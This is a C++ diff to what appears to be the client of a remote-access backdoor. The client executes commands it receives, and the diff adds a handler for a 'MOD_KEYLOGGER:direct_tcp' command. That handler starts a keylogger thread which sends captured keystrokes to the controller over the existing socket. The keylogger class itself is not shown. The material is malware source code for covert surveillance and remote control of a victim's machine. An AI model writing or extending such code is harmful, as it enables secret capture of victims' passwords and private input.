@@ -6,6 +6,7 @@
 #include "../inc/other.h"
 #include "../inc/Exec.h"
 #include "../inc/Destruction.h"
+#include "../inc/Keylogger.h"
 
 using namespace std;
 
@@ -168,6 +169,20 @@ INT Connexion::main()
                 exit(0);
             }
 
+            else if(command.substr(0,14) == L"MOD_KEYLOGGER:")
+            {
+                wcout << "mod keylogger \n\n" << endl;
+                Keylogger keylogger(sock_client);
+                
+                
+                if(command.substr(14, 10) == L"direct_tcp")
+                {
+                    wcout << "direct_tp !!!!!!!\n" << endl;
+                    HANDLE thread_to_finish = keylogger.startThread(); //start directTcp()
+                    keylogger.waitingEndSession(thread_to_finish);                     
+                } 
+            }
+            
             else
             {
                 result = Exec().executeCommand(command);
